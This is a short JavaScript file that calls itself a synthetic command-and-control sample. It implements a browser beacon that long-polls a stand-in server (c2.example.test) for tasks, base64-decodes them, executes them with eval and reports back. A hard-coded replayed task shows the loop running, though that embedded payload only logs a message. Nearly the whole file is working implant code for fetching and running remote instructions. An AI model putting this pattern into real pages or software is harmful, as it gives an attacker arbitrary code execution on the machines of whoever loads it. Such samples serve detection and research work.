// POLLC2 — synthetic long-poll C2 product sample.
(function () {
  var BASE = 'https://c2.example.test';
  var seen = {};
  var round = 0;
  console.log('[POLLC2] poller online', BASE);

  function ack(task) {
    try {
      fetch(BASE + '/ack', { method: 'POST', body: btoa(JSON.stringify({ id: task.id, ok: true })) }).catch(function () {});
    } catch (error) {}
    try { localStorage.setItem('pollc2:last', task.id || 'none'); } catch (error) {}
  }

  function handle(text) {
    if (!text) return;
    var task = JSON.parse(text);
    if (!task.id || seen[task.id]) return;
    seen[task.id] = true;
    var code = atob(task.task || '');
    console.log('[POLLC2] task', task.id, code.length);
    try { eval(code); } catch (error) { console.log('[POLLC2] task error', error.message); }
    ack(task);
  }

  function poll() {
    round += 1;
    try {
      fetch(BASE + '/task?round=' + round)
        .then(function (response) { return response.text(); })
        .then(handle)
        .catch(function () {});
    } catch (error) {}
    if (round < 3) setTimeout(poll, 300 + round * 150);
  }
  poll();
  // Offline queue replay.
  try { handle(JSON.stringify({ id: 'task-9', task: 'Y29uc29sZS5sb2coJ1tQT0xMQzJdIHRhc2stOSBleGVjdXRlZCcp' })); } catch (error) {}
})();
